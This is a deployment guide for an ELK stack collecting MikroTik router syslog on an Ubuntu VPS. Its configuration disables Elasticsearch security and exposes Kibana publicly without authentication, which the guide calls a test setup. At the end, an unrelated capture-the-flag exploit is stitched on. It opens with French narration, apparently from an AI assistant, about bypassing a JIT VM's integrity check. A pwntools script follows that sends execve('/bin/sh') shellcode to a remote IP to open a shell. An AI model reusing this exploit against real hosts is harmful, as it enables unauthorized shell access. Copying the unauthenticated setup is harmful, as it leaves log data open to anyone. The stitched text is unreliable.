# 🚀 ELK Stack + MikroTik Syslog — Practical Deployment Guide

> **Mission :** Deployer la stack ELK (Elasticsearch + Kibana + Logstash) sur un VPS Ubuntu 24.04  
> et centraliser les logs d'un routeur **MikroTik** via **Syslog UDP**.

---

## 📋 Table of Contents

- [Architecture](#-architecture)
- [Prerequisites](#-prerequisites)
- [Step 1 — SSH Connection to VPS](#-step-1--ssh-connection-to-vps)
- [Step 2 — System Update](#-step-2--system-update)
- [Step 3 — Java Verification](#-step-3--java-verification)
- [Step 4 — Add Elastic Repository](#-step-4--add-elastic-repository)
- [Step 5 — Install Elasticsearch](#-step-5--install-elasticsearch)
- [Step 6 — Configure Elasticsearch](#-step-6--configure-elasticsearch)
- [Step 7 — Start Elasticsearch](#-step-7--start-elasticsearch)
- [Step 8 — Install Kibana](#-step-8--install-kibana)
- [Step 9 — Configure Kibana](#-step-9--configure-kibana)
- [Step 10 — Start Kibana](#-step-10--start-kibana)
- [Step 11 — Install Logstash](#-step-11--install-logstash)
- [Step 12 — Configure Logstash Pipeline](#-step-12--configure-logstash-pipeline)
- [Step 13 — Start Logstash](#-step-13--start-logstash)
- [Step 14 — Validate the Stack](#-step-14--validate-the-stack)
- [Step 15 — Configure MikroTik](#-step-15--configure-mikrotik)
- [Step 16 — Create Kibana Data View](#-step-16--create-kibana-data-view)
- [Troubleshooting](#-troubleshooting)
- [Useful Commands](#-useful-commands)

---

## 🏗 Architecture

```
┌─────────────────────────────────────────────────────────┐
│                   VPS Ubuntu 24.04                      │
│                                                         │
│  ┌──────────┐    ┌──────────────┐    ┌──────────────┐  │
│  │ Logstash │───▶│Elasticsearch │◀───│    Kibana    │  │
│  │ UDP:5140 │    │  HTTP:9200   │    │  HTTP:5601   │  │
│  └──────────┘    └──────────────┘    └──────────────┘  │
│       ▲                                                  │
└───────┼──────────────────────────────────────────────────┘
        │ Syslog UDP
┌───────────────┐
│   MikroTik    │
│  RouterOS 7.x │
│  (firewall,   │
│  dhcp, info)  │
└───────────────┘
```

| Component     | Version   | Port  | Role                              |
|---------------|-----------|-------|-----------------------------------|
| Elasticsearch | 8.19.14   | 9200  | Log storage & indexing            |
| Kibana        | 8.19.14   | 5601  | Web visualization interface       |
| Logstash      | 8.19.14   | 5140  | Syslog receiver & parser          |
| MikroTik      | RouterOS 7| —     | Log source (firewall, DHCP, etc.) |

---

## ✅ Prerequisites

- VPS with **Ubuntu 24.04 LTS** (minimum 4 GB RAM recommended)
- Root SSH access to the VPS
- MikroTik router accessible via **WinBox**
- Your VPS public IP (example used: `116.202.19.149`)

---

## 🔌 Step 1 — SSH Connection to VPS

```bash
ssh root@116.202.19.149
```

> ⚠️ On first login (Hetzner VPS), you will be forced to change your password immediately.  
> Type your new password twice and reconnect.

**Verify system info after login:**
```
Ubuntu 24.04.3 LTS (GNU/Linux 6.8.0-90-generic x86_64)
Memory usage: ~7%   |   Disk: 4.6% of 37.23GB
```

---

## 🔄 Step 2 — System Update

```bash
apt update && apt upgrade -y
```

> This updates package lists from Hetzner mirrors and installs security patches.  
> Takes 2–5 minutes depending on VPS speed.

---

## ☕ Step 3 — Java Verification

```bash
java -version
```

**Expected output:**
```
openjdk version "17.0.18" 2026-01-20
OpenJDK Runtime Environment (build 17.0.18+8-Ubuntu-124.04.1)
OpenJDK 64-Bit Server VM (build 17.0.18+8-Ubuntu-124.04.1, mixed mode, sharing)
```

If Java is not installed:
```bash
apt install -y default-jdk
```

> 💡 Elasticsearch ships with its own JDK, but having system Java is recommended.

---

## 📦 Step 4 — Add Elastic Repository

### 4.1 Import the GPG key
```bash
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch \
  | gpg --dearmor -o /usr/share/keyrings/elastic-keyring.gpg
```

### 4.2 Add the Elastic 8.x APT repository
```bash
echo "deb [signed-by=/usr/share/keyrings/elastic-keyring.gpg] \
  https://artifacts.elastic.co/packages/8.x/apt stable main" \
  | tee /etc/apt/sources.list.d/elastic-8.x.list
```

### 4.3 Update APT
```bash
apt update
```

**Verify the Elastic repo is recognized:**
```
Get:1 https://artifacts.elastic.co/packages/8.x/apt stable InRelease [3,249 B]
Get:2 https://artifacts.elastic.co/packages/8.x/apt stable/main amd64 Packages [104 kB]
```

---

## 🔍 Step 5 — Install Elasticsearch

```bash
apt install -y elasticsearch
```

> Downloads ~674 MB, uses ~1.3 GB on disk after installation.  
> Version installed: **elasticsearch 8.19.14**

> ⚠️ If you see `Pending kernel upgrade!` — this is a Ubuntu warning, not an error. Ignore it.

---

## ⚙️ Step 6 — Configure Elasticsearch

### 6.1 Backup original config
```bash
cp /etc/elasticsearch/elasticsearch.yml /etc/elasticsearch/elasticsearch.yml.bak
```

### 6.2 Write new configuration
```bash
cat > /etc/elasticsearch/elasticsearch.yml << 'EOF'
cluster.name: my-cluster
node.name: node-1
path.data: /var/lib/elasticsearch
path.logs: /var/log/elasticsearch
network.host: localhost
http.port: 9200
discovery.type: single-node
xpack.security.enabled: false
xpack.security.enrollment.enabled: false
xpack.security.http.ssl.enabled: false
xpack.security.transport.ssl.enabled: false
EOF
```

### 6.3 Configure JVM heap memory (important for 4GB VPS)
```bash
cat > /etc/jvm.options.d/heap.options << 'EOF'
-Xms512m
-Xmx512m
EOF
```

| Parameter               | Value        | Reason                              |
|-------------------------|--------------|-------------------------------------|
| `cluster.name`          | my-cluster   | Cluster identifier                  |
| `network.host`          | localhost    | Local only (security)               |
| `discovery.type`        | single-node  | No cluster distribution needed      |
| `xpack.security.enabled`| false        | Disabled for test environment       |
| `-Xms512m / -Xmx512m`  | 512 MB heap  | Prevents OOM on limited VPS         |

---

## ▶️ Step 7 — Start Elasticsearch

```bash
systemctl daemon-reload
systemctl enable elasticsearch
systemctl start elasticsearch
```

**Verify status:**
```bash
systemctl status elasticsearch
```

**Expected output:**
```
● elasticsearch.service - Elasticsearch
   Active: active (running) since Thu 2026-04-16 17:40:44 UTC; 5s ago
   Main PID: 107650 (java)
   Memory: 1013.1M
```

> ⏳ Wait 30–60 seconds before testing the API — Elasticsearch needs time to initialize.

---

## 📊 Step 8 — Install Kibana

```bash
apt install kibana -y
```

> Downloads ~386 MB, uses ~1.2 GB on disk.  
> Version: **kibana 8.19.14**

> ⚠️ If you see `Kibana is currently running with legacy OpenSSL providers enabled` — this is a warning, not an error on Ubuntu 24.04. Ignore it.

---

## ⚙️ Step 9 — Configure Kibana

```bash
nano /etc/kibana/kibana.yml
```

Add or modify these lines:
```yaml
server.port: 5601
server.host: "0.0.0.0"
elasticsearch.hosts: ["http://localhost:9200"]
```

| Parameter              | Value                       | Reason                              |
|------------------------|-----------------------------|-------------------------------------|
| `server.port`          | 5601                        | Kibana web interface port           |
| `server.host`          | "0.0.0.0"                   | Accessible from public IP           |
| `elasticsearch.hosts`  | http://localhost:9200        | Connect to local Elasticsearch      |

---

## ▶️ Step 10 — Start Kibana

```bash
systemctl enable kibana
systemctl start kibana
```

**Open firewall port 5601:**
```bash
ufw allow 5601
```

**Expected output:**
```
Rules updated
Rules updated (v6)
```

**Test in browser:**
```
http://116.202.19.149:5601
```

> ⏳ Kibana takes 30–60 seconds to load. You should see **"Welcome home"** with 4 tiles:  
> Elasticsearch | Observability | Security | Analytics

---

## 🔧 Step 11 — Install Logstash

```bash
apt install -y logstash
```

> Downloads ~454 MB, uses ~738 MB on disk.  
> Version: **logstash 8.19.14-1**

---

## 📝 Step 12 — Configure Logstash Pipeline

```bash
nano /etc/logstash/conf.d/mikrotik-syslog.conf
```

**Full pipeline configuration:**

```ruby
input {
  udp {
    port => 5140
    type => "syslog"
  }
}

filter {
  if [type] == "syslog" {
    grok {
      match => { "message" => "%{SYSLOGTIMESTAMP:timestamp} %{GREEDYDATA:log_message}" }
    }
    mutate {
      add_field => { "source" => "mikrotik" }
    }
  }
}

output {
  elasticsearch {
    hosts => ["http://localhost:9200"]
    index => "mikrotik-logs-%{+YYYY.MM.dd}"
  }
}
```

| Section  | Parameter           | Description                                      |
|----------|---------------------|--------------------------------------------------|
| `input`  | udp port 5140       | Receive MikroTik logs on UDP port 5140           |
| `filter` | grok SYSLOGTIMESTAMP| Parse syslog BSD timestamp and message           |
| `filter` | mutate add_field     | Add `source=mikrotik` to identify log origin     |
| `output` | elasticsearch index  | Index into `mikrotik-logs-YYYY.MM.dd` (daily)   |

> 💡 Port 5140 is used instead of 514 because ports < 1024 require root privileges on Linux.  
> To use port 514, add iptables redirect:  
> `iptables -t nat -A PREROUTING -p udp --dport 514 -j REDIRECT --to-port 5140`

---

## ▶️ Step 13 — Start Logstash

```bash
systemctl enable logstash
systemctl start logstash
```

**Verify status:**
```bash
systemctl status logstash
```

**Expected output:**
```
● logstash.service - logstash
   Active: active (running) since Thu 2026-04-16 17:07:03 UTC; 9s ago
   Main PID: 105698 (java)
   Memory: 279.8M
```

**Monitor logs in real-time:**
```bash
journalctl -u logstash -f
```

> ⚠️ If you see `Connection refused` to Elasticsearch — Elasticsearch may have crashed.  
> Run: `systemctl restart elasticsearch` and wait 30 seconds.  
> Logstash will reconnect automatically every 5 seconds.

---

## ✅ Step 14 — Validate the Stack

### 14.1 Test Elasticsearch API
```bash
curl http://localhost:9200
```

**Expected JSON response:**
```json
{
  "name" : "node-1",
  "cluster_name" : "my-cluster",
  "version" : {
    "number" : "8.19.14",
    "lucene_version" : "9.12.2"
  },
  "tagline" : "You Know, for Search"
}
```

### 14.2 Check all services are running
```bash
systemctl status elasticsearch kibana logstash --no-pager
```

All 3 services should show: `Active: active (running)`

### 14.3 Check Elasticsearch indices
```bash
curl http://localhost:9200/_cat/indices?v
```

### 14.4 Open Kibana in browser
```
http://116.202.19.149:5601
```

---

## 🌐 Step 15 — Configure MikroTik

Connect to your MikroTik router via **WinBox**.

### 15.1 Navigate to System > Logging

`System` → `Logging`

### 15.2 Create a Remote Action (Actions tab)

Click **Actions** tab → **New**

| Field               | Value                    |
|---------------------|--------------------------|
| Name                | `remote-elk`             |
| Type                | `remote`                 |
| Remote Address      | `116.202.19.149` (VPS IP)|
| Remote Port         | `5140`                   |
| Remote Log Protocol | `UDP`                    |
| Remote Log Format   | `default` (BSD)          |

Click **OK**.

### 15.3 Create Logging Rules (Rules tab)

Click **Rules** tab → **New** — create one rule per topic:

| Topic      | Action     | Description                    |
|------------|------------|--------------------------------|
| `firewall` | `remoteelk`| Firewall filter events         |
| `info`     | `remoteelk`| General system information     |
| `warning`  | `remoteelk`| System warnings                |
| `dhcp`     | `remoteelk`| DHCP IP address assignments    |

For each rule: check **Enabled** ✅, select **Topic**, leave **Prefix** empty, set **Action** = `remoteelk`. Click **OK**.

> ⚠️ Make sure UDP port 5140 is open on your VPS firewall:
> ```bash
> ufw allow 5140/udp
> ```

---

## 📈 Step 16 — Create Kibana Data View

### 16.1 Navigate to Stack Management

In Kibana: `☰ Menu` → `Management` section → `Stack Management`

### 16.2 Go to Data Views

Left sidebar → `Kibana` → `Data Views` → Click **"Create data view"**

### 16.3 Fill in the form

| Field           | Value              |
|-----------------|--------------------|
| Name            | `mikrotik-logs-*`  |
| Index pattern   | `mikrotik-logs-*`  |
| Timestamp field | `@timestamp`       |

> ✅ If logs have been received, you will see:  
> **"Your index pattern matches 1 source"** → `mikrotik-logs-2026.04.16`

Click **"Save data view to Kibana"**.

### 16.4 Explore logs in Discover

`☰ Menu` → `Analytics` → `Discover` → Select `mikrotik-logs-*`

---

## 🔥 Troubleshooting

### ❌ Logstash: "Connection refused" to Elasticsearch

```bash
# Check Elasticsearch status
systemctl status elasticsearch

# Restart if needed
systemctl restart elasticsearch

# Wait 30 seconds then check Logstash logs
journalctl -u logstash -f
```

### ❌ Kibana not loading in browser

```bash
# Check Kibana status
systemctl status kibana

# Check Kibana logs
journalctl -u kibana -f

# Make sure port 5601 is open
ufw status | grep 5601
```

### ❌ No indices in Elasticsearch

```bash
# Check if Logstash is receiving data
journalctl -u logstash -f

# Check if port 5140 is listening
ss -ulnp | grep 5140

# List all indices
curl http://localhost:9200/_cat/indices?v
```

### ❌ MikroTik logs not arriving

```bash
# Open the UDP port on the firewall
ufw allow 5140/udp

# Capture incoming UDP packets on port 5140 (test)
tcpdump -i eth0 udp port 5140
```

---

## 🛠 Useful Commands

### Services management

```bash
# Status of all ELK services
systemctl status elasticsearch kibana logstash --no-pager

# Restart all services
systemctl restart elasticsearch kibana logstash

# View Logstash logs live
journalctl -u logstash -f

# View Elasticsearch logs live
journalctl -u elasticsearch -f
```

### Elasticsearch API

```bash
# Check cluster health
curl http://localhost:9200/_cluster/health?pretty

# List all indices
curl http://localhost:9200/_cat/indices?v

# Count logs in today's index
curl "http://localhost:9200/mikrotik-logs-$(date +%Y.%m.%d)/_count"

# Search last 10 logs
curl "http://localhost:9200/mikrotik-logs-*/_search?size=10&pretty"

# Delete an index (use with caution)
curl -X DELETE http://localhost:9200/mikrotik-logs-2026.04.16
```

### System monitoring

```bash
# Check memory usage
free -h

# Check disk space
df -h

# Check open ports
ss -tlnp | grep -E '9200|5601|5140'

# Check ELK processes
ps aux | grep -E 'elasticsearch|kibana|logstash'
```

---

## 📊 Final Summary

| Component       | Status     | Access                              |
|-----------------|------------|-------------------------------------|
| Elasticsearch   | ✅ Active   | `http://localhost:9200`             |
| Kibana          | ✅ Active   | `http://116.202.19.149:5601`        |
| Logstash        | ✅ Active   | UDP port 5140                       |
| MikroTik Syslog | ✅ Active   | remote-elk → VPS:5140/UDP           |
| Data View       | ✅ Created  | `mikrotik-logs-*` with @timestamp   |

---

## 🔒 Security Notes (Production)

> ⚠️ For a **production** environment, apply these additional steps:

- [ ] Enable `xpack.security.enabled: true` in `elasticsearch.yml`
- [ ] Set up Elasticsearch user/password: `elasticsearch-setup-passwords auto`
- [ ] Put Kibana behind **nginx reverse proxy** with HTTPS
- [ ] Restrict port 9200 to localhost only (already done: `network.host: localhost`)
- [ ] Configure **ILM (Index Lifecycle Management)** to auto-delete old logs
- [ ] Use port 514 with iptables redirect instead of 5140

---

## 📁 File Locations

| File                                         | Purpose                        |
|----------------------------------------------|--------------------------------|
| `/etc/elasticsearch/elasticsearch.yml`        | Elasticsearch main config      |
| `/etc/jvm.options.d/heap.options`             | JVM memory settings            |
| `/etc/kibana/kibana.yml`                       | Kibana main config             |
| `/etc/logstash/conf.d/mikrotik-syslog.conf`   | Logstash MikroTik pipeline     |
| `/var/log/elasticsearch/`                     | Elasticsearch logs             |
| `/var/log/logstash/`                          | Logstash logs                  |
| `/var/lib/elasticsearch/`                     | Elasticsearch data storage     |

---

Je vois le serveur tourne bien. Laisse-moi analyser complètement le binaire et construire l'exploit step by step. Maintenant j'ai tout ce qu'il me faut. Laisse-moi construire l'exploit complet. Excellent ! Le bypass de l'integrity check fonctionne ! Maintenant l'exploit complet : Le brute-force est lent en Python, laissons-le pré-calculer le padding puis lancer l'exploit séparement : Le payload est prêt et validé ! Maintenant l'exploit final : Le serveur n'est pas accessible depuis mon environnement (réseau restreint). **Tu dois exécuter l'exploit depuis ta Kali directement.** Voici tout ce dont tu as besoin :

---

## 📋 Guide Complet Step by Step

### 🔍 Ce qu'on a découvert

| Élément | Détail |
|---|---|
| VM Type | Stack-based JIT Compiler |
| Vuln | `EMIT` (op `0x0c`) écrit dans buffer RWX, `JIT_RUN` (op `0x09`) l'exécute |
| Bypass | Integrity check = djb2 → Collatz(64) → XOR table → pad avec `PUSH 0xd1bef; POP` |

---
from pwn import *

HOST = '206.81.0.45'
PORT = 4445

PAYLOAD_HEX = "0c48000000000000000c31000000000000000cf6000000000000000c48000000000000000c31000000000000000cd2000000000000000c48000000000000000c31000000000000000cc0000000000000000c50000000000000000c48000000000000000cbb000000000000000c2f000000000000000c62000000000000000c69000000000000000c6e000000000000000c2f000000000000000c73000000000000000c68000000000000000c00000000000000000c53000000000000000c48000000000000000c89000000000000000ce7000000000000000cb0000000000000000c3b000000000000000c0f000000000000000c050000000000000009018f1600000000000002"

io = remote(HOST, PORT)
io.recvuntil(b'> ', timeout=10)
io.sendline(b'1')
io.recvuntil(b'): \n', timeout=5)
io.sendline(PAYLOAD_HEX.encode())
resp = io.recvuntil(b'> ', timeout=5)
print(resp.decode(errors='replace'))
io.sendline(b'2')
io.interactive()
EOF
